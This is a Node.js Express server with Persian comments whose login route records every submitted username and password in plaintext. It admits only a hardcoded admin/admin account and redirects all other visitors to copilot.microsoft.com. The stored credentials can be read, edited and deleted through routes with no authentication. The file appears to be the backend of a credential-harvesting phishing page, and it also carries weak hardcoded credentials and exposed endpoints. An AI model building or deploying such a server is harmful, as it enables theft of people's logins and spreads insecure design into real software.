const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const PORT = 3000;

// ذخیره‌ی اطلاعات ورودها (در حافظه)
let storedData = [];

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// مسیر لاگین
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const time = new Date().toLocaleString();

  // ذخیره اطلاعات ورود
  storedData.push(`User: ${username}, Pass: ${password}, Time: ${time}`);

  if (username === "admin" && password === "admin") {
    res.redirect("/dashboard.html");
  } else {
    res.redirect("https://copilot.microsoft.com/");
  }
});

// مسیر ذخیره اطلاعات اضافی در داشبورد
app.post("/save", (req, res) => {
  const { info } = req.body;
  const time = new Date().toLocaleString();
  storedData.push(`Info: ${info}, Time: ${time}`);
  res.json({ success: true, data: storedData });
});

// مسیر گرفتن همه داده‌ها
app.get("/data", (req, res) => {
  res.json(storedData);
});

// مسیر حذف داده بر اساس ایندکس
app.delete("/delete/:index", (req, res) => {
  const index = parseInt(req.params.index);
  if (index >= 0 && index < storedData.length) {
    storedData.splice(index, 1);
    res.json({ success: true, data: storedData });
  } else {
    res.json({ success: false, message: "Invalid index" });
  }
});

// مسیر ویرایش داده بر اساس ایندکس
app.put("/edit/:index", (req, res) => {
  const index = parseInt(req.params.index);
  const { newInfo } = req.body;
  if (index >= 0 && index < storedData.length) {
    storedData[index] = `Edited: ${newInfo}, Time: ${new Date().toLocaleString()}`;
    res.json({ success: true, data: storedData });
  } else {
    res.json({ success: false, message: "Invalid index" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});